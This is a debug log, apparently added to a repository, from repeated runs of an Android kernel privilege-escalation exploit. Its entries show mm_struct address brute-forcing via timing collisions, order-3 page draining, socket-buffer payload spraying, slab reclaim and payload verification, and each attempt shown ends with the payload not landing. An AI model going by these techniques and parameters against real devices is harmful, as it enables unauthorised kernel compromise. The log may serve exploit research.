+[b24e39de8 23:24:43] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:24:43] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:24:43] [33m[*][t13553] [0mpayload nonce want=2115930f308697ed got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:24:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d9b9070 len=8 fill=0 pos=7883678008957363548 page=92978c330e252b14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:24:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d9b9070 len=8 fill=0 pos=7883678008957363548 page=92978c330e252b14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:24:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d9b9070 len=8 fill=0 pos=7883678008957363548 page=92978c330e252b14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:24:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d9b9100 len=8 fill=0 pos=7883678008957363548 page=92978c330e252ba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:24:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d9b9100 len=8 fill=0 pos=7883678008957363548 page=92978c330e252ba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:24:43] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff943d9b9100 len=8 fill=0 pos=7883678008957363548 page=92978c330e252ba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:24:43] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:24:43] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:24:43] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:24:43] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:24:43] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff943d9b8000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:24:43] [31m[-][t13553] [0mprepare_kernel_page retry 2/72
+[b24e39de8 23:24:43] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:24:45] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:24:45] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:24:45] [33m[*][t26020] [0mapprox_time=7 thr=70
+[b24e39de8 23:24:46] [33m[*][t26020] [0mstart finding collisisons
+[b24e39de8 23:24:46] [33m[*][t26020] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:24:46] [33m[*][t26020] [0mtarget_time=135 thr=70
+[b24e39de8 23:24:46] [33m[*][t26020] [0m  0000006987693038 i=519 t=17620/17476/17565
+[b24e39de8 23:24:49] [33m[*][t26020] [0m  000000698893a570 i=5294 t=14372/17580/17610
+[b24e39de8 23:24:50] [33m[*][t26020] [0m  0000006988bdda88 i=5969 t=13174/17742/17474
+[b24e39de8 23:24:50] [33m[*][t26020] [0m  0000006988ed8260 i=6732 t=17598/17416/17550
+[b24e39de8 23:24:51] [33m[*][t26020] [0m  000000698956e710 i=8418 t=14112/17597/17581
+[b24e39de8 23:24:51] [33m[*][t26020] [0mfound 5 collisisons
+[b24e39de8 23:24:52] [33m[*][t26020] [0mpost-pile baseline=21 target=24 count=5
+[b24e39de8 23:24:52] [33m[*][t26020] [0mpost-pile[1] 0000006987693038 t=25
+[b24e39de8 23:24:52] [33m[*][t26020] [0mpost-pile[2] 000000698893a570 t=25
+[b24e39de8 23:24:52] [33m[*][t26020] [0mpost-pile[3] 0000006988bdda88 t=25
+[b24e39de8 23:24:52] [33m[*][t26020] [0mpost-pile[4] 0000006988ed8260 t=25
+[b24e39de8 23:24:52] [33m[*][t26020] [0mpost-pile[5] 000000698956e710 t=25
+[b24e39de8 23:24:52] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:24:52] [33m[*][t30179] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:24:52] [33m[*][t30180] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:24:52] [33m[*][t30183] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:24:52] [33m[*][t30185] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:24:52] [33m[*][t30182] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:24:52] [33m[*][t30181] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:24:52] [33m[*][t30184] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:24:52] [33m[*][t30186] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:24:52] [33m[*][t30179] [0m[  0] scan done coarse=ffffff9240000000 end=ffffff9240000000 found=0
+[b24e39de8 23:24:52] [33m[*][t30186] [0m[  7] scan done coarse=ffffff9540000000 end=ffffff9540000000 found=0
+[b24e39de8 23:24:52] [33m[*][t30184] [0mfound mm_struct ffffff942e58bfc0
+[b24e39de8 23:24:52] [33m[*][t30181] [0m[  2] scan done coarse=ffffff9340000000 end=ffffff9340000000 found=0
+[b24e39de8 23:24:52] [33m[*][t30184] [0m[  5] scan done coarse=ffffff9440000000 end=ffffff9480000000 found=1
+[b24e39de8 23:24:52] [33m[*][t30183] [0m[  4] scan done coarse=ffffff9400000000 end=ffffff9400000000 found=1
+[b24e39de8 23:24:52] [33m[*][t30180] [0m[  1] scan done coarse=ffffff9280000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:24:52] [33m[*][t30182] [0m[  3] scan done coarse=ffffff9380000000 end=ffffff9380000000 found=1
+[b24e39de8 23:24:52] [33m[*][t30185] [0m[  6] scan done coarse=ffffff94c0000000 end=ffffff9500000000 found=1
+[b24e39de8 23:24:52] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff942e588000 phys_probe=0xffffff91e2bd1d38 delta=9858409160 (9.2GB)
+[b24e39de8 23:24:52] [33m[*][t13553] [0mprepare_skb_payload base=ffffff942e588000 delta=0 payload_base=ffffff942e588000
+[b24e39de8 23:24:52] [33m[*][t13553] [0mskbdelta wrote pb=ffffff942e588000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:24:52] [33m[*][t13553] [0mpayload nonce 3292a6a83086979e at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:24:52] [33m[*][t13553] [0mdone
+[b24e39de8 23:24:52] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:24:52] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:24:52] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:52] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:52] [33m[*][t13553] [0mfix40 free-arm n=7 est_pfn=3073416 k=[-2,4]
+[b24e39de8 23:24:53] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:24:53] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:24:53] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:24:53] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:24:53] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:24:53] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:24:54] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:24:54] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:24:54] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:24:54] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:54] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:24:54] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:24:54] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:24:54] [33m[*][t13553] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3073416 k=[-2,4] k_fixed=-1
+[b24e39de8 23:24:54] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:24:54] [33m[*][t13553] [0mfix36 phase1 tp ctrl=530 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:24:54] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:24:54] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:24:54] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:24:54] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:24:55] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:24:55] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:24:55] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:24:55] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:24:55] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:24:55] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:24:55] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:24:55] [33m[*][t13553] [0mfix40 free HIT pfn=3335560 k=1 hits=1
+[b24e39de8 23:24:55] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:24:55] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:24:55] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff942e589100 errno=22
+[b24e39de8 23:24:55] [31m[-][t13553] [0mwatchpoint open open addr=ffffff942e589070 errno=22
+[b24e39de8 23:24:55] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff942e58ff00 errno=22
+[b24e39de8 23:24:55] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:24:55] [33m[*][t30202] [0mfix36 tp arm n=7 ctrl=1 est_pfn=3073416 k=[-2,4] k_fixed=-1
+[b24e39de8 23:24:55] [33m[*][t30202] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:24:55] [33m[*][t30202] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:24:55] [33m[*][t30202] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:24:55] [33m[*][t30202] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:24:55] [33m[*][t30202] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:24:56] [33m[*][t30202] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:24:56] [33m[*][t30202] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:24:56] [33m[*][t30202] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:24:56] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=897
+[b24e39de8 23:24:56] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:24:56] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:24:56] [33m[*][t13553] [0mfix36 phase2 tp ctrl=902 ord3=897 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:24:56] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff942e58a238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:24:56] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:24:56] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 38[b24e39de8 23:24:56] [33m[*][t13553] [0m 2f[b24e39de8 23:24:56] [33m[*][t13553] [0m de[b24e39de8 23:24:56] [33m[*][t13553] [0m 6a[b24e39de8 23:24:56] [33m[*][t13553] [0m d3[b24e39de8 23:24:56] [33m[*][t13553] [0m ff[b24e39de8 23:24:56] [33m[*][t13553] [0m ff[b24e39de8 23:24:56] [33m[*][t13553] [0m ff[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m 00[b24e39de8 23:24:56] [33m[*][t13553] [0m
+[b24e39de8 23:24:56] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:24:56] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
+[b24e39de8 23:24:56] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:24:56] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:24:56] [33m[*][t13553] [0mpayload nonce want=3292a6a83086979e got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:24:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff942e589070 len=8 fill=0 pos=7883678008957363548 page=92978c32fee22b14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:24:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff942e589070 len=8 fill=0 pos=7883678008957363548 page=92978c32fee22b14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:24:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff942e589070 len=8 fill=0 pos=7883678008957363548 page=92978c32fee22b14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:24:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff942e589100 len=8 fill=0 pos=7883678008957363548 page=92978c32fee22ba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:24:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff942e589100 len=8 fill=0 pos=7883678008957363548 page=92978c32fee22ba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:24:56] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff942e589100 len=8 fill=0 pos=7883678008957363548 page=92978c32fee22ba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:24:56] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:24:56] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:24:56] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:24:56] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:24:56] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff942e588000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:24:56] [31m[-][t13553] [0mprepare_kernel_page retry 3/72
+[b24e39de8 23:24:56] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:24:58] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:24:58] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:24:58] [33m[*][t31546] [0mapprox_time=8 thr=80
+[b24e39de8 23:24:59] [33m[*][t31546] [0mstart finding collisisons
+[b24e39de8 23:24:59] [33m[*][t31546] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:24:59] [33m[*][t31546] [0mtarget_time=136 thr=80
+[b24e39de8 23:24:59] [33m[*][t31546] [0m  0000006987808be0 i=892 t=17611/14138/17720
+[b24e39de8 23:25:01] [33m[*][t31546] [0m  00000069881063d0 i=3194 t=17530/17742/15644
+[b24e39de8 23:25:03] [33m[*][t31546] [0m  00000069895cda08 i=8513 t=17780/17754/14444
+[b24e39de8 23:25:04] [33m[*][t31546] [0m  00000069899b3938 i=9511 t=15754/15842/17713
+[b24e39de8 23:25:05] [33m[*][t31546] [0m  00000069899dea90 i=9554 t=17678/17741/14228
+[b24e39de8 23:25:05] [33m[*][t31546] [0mfound 5 collisisons
+[b24e39de8 23:25:05] [33m[*][t31546] [0mpost-pile baseline=24 target=25 count=5
+[b24e39de8 23:25:05] [33m[*][t31546] [0mpost-pile[1] 0000006987808be0 t=25
+[b24e39de8 23:25:05] [33m[*][t31546] [0mpost-pile[2] 00000069881063d0 t=25
+[b24e39de8 23:25:05] [33m[*][t31546] [0mpost-pile[3] 00000069895cda08 t=25
+[b24e39de8 23:25:05] [33m[*][t31546] [0mpost-pile[4] 00000069899b3938 t=26
+[b24e39de8 23:25:05] [33m[*][t31546] [0mpost-pile[5] 00000069899dea90 t=26
+[b24e39de8 23:25:05] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:25:05] [33m[*][t6503] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:25:05] [33m[*][t6506] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:25:05] [33m[*][t6507] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:25:05] [33m[*][t6512] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:25:05] [33m[*][t6513] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:25:05] [33m[*][t6514] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:25:05] [33m[*][t6510] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:25:05] [33m[*][t6511] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:25:05] [33m[*][t6512] [0mfound mm_struct ffffff94158192c0
+[b24e39de8 23:25:05] [33m[*][t6511] [0m[  4] scan done coarse=ffffff9400000000 end=ffffff9400000000 found=1
+[b24e39de8 23:25:05] [33m[*][t6512] [0m[  5] scan done coarse=ffffff9440000000 end=ffffff9480000000 found=1
+[b24e39de8 23:25:05] [33m[*][t6507] [0m[  2] scan done coarse=ffffff9300000000 end=ffffff9340000000 found=1
+[b24e39de8 23:25:05] [33m[*][t6510] [0m[  3] scan done coarse=ffffff9380000000 end=ffffff9380000000 found=1
+[b24e39de8 23:25:05] [33m[*][t6513] [0m[  6] scan done coarse=ffffff94c0000000 end=ffffff9500000000 found=1
+[b24e39de8 23:25:05] [33m[*][t6503] [0m[  0] scan done coarse=ffffff9240000000 end=ffffff9240000000 found=1
+[b24e39de8 23:25:05] [33m[*][t6506] [0m[  1] scan done coarse=ffffff9280000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:25:05] [33m[*][t6514] [0m[  7] scan done coarse=ffffff9540000000 end=ffffff9540000000 found=1
+[b24e39de8 23:25:05] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff9415818000 phys_probe=0xffffff91e2bd1d38 delta=9441665736 (8.8GB)
+[b24e39de8 23:25:05] [33m[*][t13553] [0mprepare_skb_payload base=ffffff9415818000 delta=0 payload_base=ffffff9415818000
+[b24e39de8 23:25:05] [33m[*][t13553] [0mskbdelta wrote pb=ffffff9415818000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:25:05] [33m[*][t13553] [0mpayload nonce 36ab2f7f3086978b at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:25:05] [33m[*][t13553] [0mdone
+[b24e39de8 23:25:05] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:25:05] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:25:05] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:05] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:05] [33m[*][t13553] [0mfix40 free-arm n=7 est_pfn=2971672 k=[-2,4]
+[b24e39de8 23:25:06] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:25:06] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:25:06] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:25:06] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:25:07] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:25:07] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:25:07] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:25:07] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:25:07] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:25:07] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:07] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:25:07] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:25:07] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:25:07] [33m[*][t13553] [0mfix36 tp arm n=7 ctrl=1 est_pfn=2971672 k=[-2,4] k_fixed=-1
+[b24e39de8 23:25:07] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:25:07] [33m[*][t13553] [0mfix36 phase1 tp ctrl=528 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:25:07] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:25:08] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:25:08] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:25:08] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:25:08] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:25:08] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:25:09] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:25:09] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:25:09] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:25:09] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:25:09] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=31 objs=884 free=170
+[b24e39de8 23:25:09] [33m[*][t13553] [0mfix40 free HIT pfn=3233816 k=1 hits=1
+[b24e39de8 23:25:09] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:25:09] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:25:09] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff9415819100 errno=22
+[b24e39de8 23:25:09] [31m[-][t13553] [0mwatchpoint open open addr=ffffff9415819070 errno=22
+[b24e39de8 23:25:09] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff941581ff00 errno=22
+[b24e39de8 23:25:09] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:25:09] [33m[*][t6535] [0mfix36 tp arm n=7 ctrl=1 est_pfn=2971672 k=[-2,4] k_fixed=-1
+[b24e39de8 23:25:09] [33m[*][t6535] [0mphase2 conn[0] sends ok=112
+[b24e39de8 23:25:09] [33m[*][t6535] [0mphase2 conn[1] sends ok=112
+[b24e39de8 23:25:09] [33m[*][t6535] [0mphase2 conn[2] sends ok=112
+[b24e39de8 23:25:09] [33m[*][t6535] [0mphase2 conn[3] sends ok=112
+[b24e39de8 23:25:09] [33m[*][t6535] [0mphase2 conn[4] sends ok=112
+[b24e39de8 23:25:09] [33m[*][t6535] [0mphase2 conn[5] sends ok=112
+[b24e39de8 23:25:09] [33m[*][t6535] [0mphase2 conn[6] sends ok=112
+[b24e39de8 23:25:09] [33m[*][t6535] [0mphase2 conn[7] sends ok=112
+[b24e39de8 23:25:09] [33m[*][t13553] [0mfix38 no capture during sends gsend=896 last_ord3=898
+[b24e39de8 23:25:09] [33m[*][t13553] [0mphase2 total sends ok=896 last_err=0 shorts=0
+[b24e39de8 23:25:09] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:25:09] [33m[*][t13553] [0mfix36 phase2 tp ctrl=904 ord3=898 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:25:09] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff941581a238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:25:09] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:25:09] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 38[b24e39de8 23:25:09] [33m[*][t13553] [0m 2f[b24e39de8 23:25:09] [33m[*][t13553] [0m de[b24e39de8 23:25:09] [33m[*][t13553] [0m 6a[b24e39de8 23:25:09] [33m[*][t13553] [0m d3[b24e39de8 23:25:09] [33m[*][t13553] [0m ff[b24e39de8 23:25:09] [33m[*][t13553] [0m ff[b24e39de8 23:25:09] [33m[*][t13553] [0m ff[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m 00[b24e39de8 23:25:09] [33m[*][t13553] [0m
+[b24e39de8 23:25:09] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:25:09] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
